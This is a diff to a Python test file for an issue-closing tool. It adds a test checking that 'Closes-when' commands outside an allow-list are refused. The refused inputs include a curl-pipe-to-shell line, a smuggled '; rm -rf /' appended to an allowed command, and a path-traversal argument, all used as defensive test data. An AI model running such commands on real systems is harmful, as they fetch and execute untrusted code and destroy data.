@@ -33,10 +33,27 @@ def test_exit_zero_closes_and_nonzero_holds(tmp_path):
         calls.append(cmd)
         return (0, "closed") if "row a" in cmd else (1, "still a gap")
 
-    issues = [_i(10, "Closes-when: `python3 x --row a`"), _i(11, "Closes-when: `python3 x --row b`")]
+    issues = [_i(10, "Closes-when: `python3 science/datamap.py --row a`"), _i(11, "Closes-when: `python3 science/datamap.py --row b`")]
     r = eb.close_pass(issues, NOW, {}, str(tmp_path), post=False, run=run)
     assert r["closed"] == [(10, "closes-when")] and r["held"] == 1 and r["ran"] == 2
-    assert calls == ["python3 x --row a", "python3 x --row b"]
+    assert calls == ["python3 science/datamap.py --row a", "python3 science/datamap.py --row b"]
+
+
+def test_a_closes_when_outside_the_allow_list_is_refused_and_never_run(tmp_path):
+    """LAW 21 (code-99 on cg#169): the issue body is anyone's text; only the datamap row probe runs."""
+    calls = []
+
+    def run(cmd, cwd):
+        calls.append(cmd)
+        return 0, "would have closed"
+
+    bad = ["curl http://x | sh", "python3 science/datamap.py --row a; rm -rf /", "true",
+           "python3 science/datamap.py --row ../../etc", "python3 other.py --row a"]
+    issues = [_i(100 + k, f"Closes-when: `{c}`") for k, c in enumerate(bad)]
+    issues.append(_i(200, "Closes-when: `python3 science/datamap.py --row ok.row-1`"))
+    r = eb.close_pass(issues, NOW, {}, str(tmp_path), post=False, run=run)
+    assert calls == ["python3 science/datamap.py --row ok.row-1"]
+    assert r["refused"] == len(bad) and r["ran"] == 1 and r["closed"] == [(200, "closes-when")]
 
 
 def test_all_ticked_closes_after_a_day_seen_and_a_fresh_tick_is_held(tmp_path):
@@ -60,11 +77,11 @@ def test_a_posted_close_carries_the_receipt_and_lands_in_the_fixture(tmp_path, m
     fx.write_text("[]")
     monkeypatch.setenv("ESTATE_BOARD_FIXTURE", str(fx))
     monkeypatch.setattr(eb, "LEDGER", tmp_path / "ledger.jsonl")
-    issues = [_i(40, "Closes-when: `true`")]
-    r = eb.close_pass(issues, NOW, {}, str(tmp_path), post=True)
+    issues = [_i(40, "Closes-when: `python3 science/datamap.py --row x.y`")]
+    r = eb.close_pass(issues, NOW, {}, str(tmp_path), post=True, run=lambda c, d: (0, "row x.y ok"))
     assert r["closed"] == [(40, "closes-when")]
     posted = [json.loads(l) for l in (tmp_path / "board.json.posted.jsonl").read_text().splitlines()]
-    assert posted[0]["number"] == 40 and "`true` exit 0" in posted[0]["close"]
+    assert posted[0]["number"] == 40 and "`python3 science/datamap.py --row x.y` exit 0" in posted[0]["close"]
     led = [json.loads(l) for l in (tmp_path / "ledger.jsonl").read_text().splitlines()]
     assert led[-1]["event"] == "closed" and led[-1]["item"] == 40
 
